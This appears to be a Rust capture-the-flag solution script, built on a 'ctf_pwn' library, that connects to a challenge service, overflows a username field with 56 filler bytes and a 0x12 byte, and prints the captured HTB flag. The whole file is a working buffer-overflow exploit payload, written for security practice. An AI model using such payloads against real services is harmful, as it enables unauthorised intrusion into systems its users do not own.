use ctf_pwn::io::*;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut pipe = TcpPipe::connect("123.123.123.123:1337").await?;

    let payload = Payload::builder()
        .recv_until(">> ", false)
        .push("2\n")
        .send()
        .recv_until("Username: ", false)
        .fill("A", 56)
        .push("\x12")
        .send()
        .recv_regex_utf8(r"HTB\{[^\}]+\}")
        .print()
        .build();

    pipe.payload(payload).await?;
    Ok(())
}
